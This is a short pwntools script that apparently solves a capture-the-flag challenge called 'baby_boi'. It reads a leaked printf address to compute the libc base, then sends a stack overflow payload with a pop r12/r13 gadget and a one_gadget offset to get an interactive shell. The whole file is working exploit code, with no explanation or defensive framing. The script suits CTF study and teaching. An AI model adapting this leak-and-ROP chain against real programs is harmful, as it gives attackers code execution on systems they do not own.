from pwn import *

# target = process('./baby_boi', env={"LD_PRELOAD":"./libc-2.27.so"})
target = process('./baby_boi')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

target.recvuntil(b"Here I am: ")

leak = target.recvline()
leak = leak.decode('utf-8').rstrip("\n")

base = int(leak, 16) - libc.symbols['printf']
print("wooo", hex(base))

oneshot = base + 0xcbd1a
popR12R13 = base + 0x28487

payload = b"0" * 0x28
payload += p64(popR12R13)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(oneshot)

target.sendline(payload)
target.interactive()

